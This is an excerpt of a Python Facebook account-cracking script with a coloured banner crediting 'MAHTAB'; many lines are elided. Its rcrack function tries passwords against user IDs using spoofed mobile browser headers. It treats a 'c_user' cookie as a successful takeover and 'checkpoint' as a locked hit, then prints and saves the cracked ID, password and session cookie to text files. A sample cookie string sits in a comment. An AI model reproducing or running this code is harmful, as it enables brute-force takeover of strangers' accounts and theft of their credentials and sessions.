...
\033[1;32m(•)==============================================🥀
\033[1;32m[🇮🇳] \033[1;33mCREATED BY   :  \033[1;33mSK ALI
\033[1;32m[🇮🇳] \033[1;34mON FACEBOK   :  \033[1;34mMAHTAB AHMAD
\033[1;32m[🇮🇳] \033[1;35mON GITHUB    :  \033[1;35mMAHTAB-12
\033[1;32m[🇮🇳] \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m[🇮🇳] \033[1;36mBEST FRIEND  :  \033[1;36mMANI & WALEED☝️😍
\033[1;32m(•)==============================================💔\n\n"""  
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[MAHTAB-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('MAHTAB-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[MAHTAB-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[MAHTAB] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def rcrack(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=SFi6ZtkjLwtMBjCUlR-zyEKV; sb=SFi6ZiSjVqtAXFC-lexstsEC; m_pixel_ratio=2; wd=360x684; fr=059eeDxvGjA2Rpn5v..BmulhI..AAA.0.0.BmulhN.AWWNh8pYObw',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[MAHTAB-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mMAHTAB\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 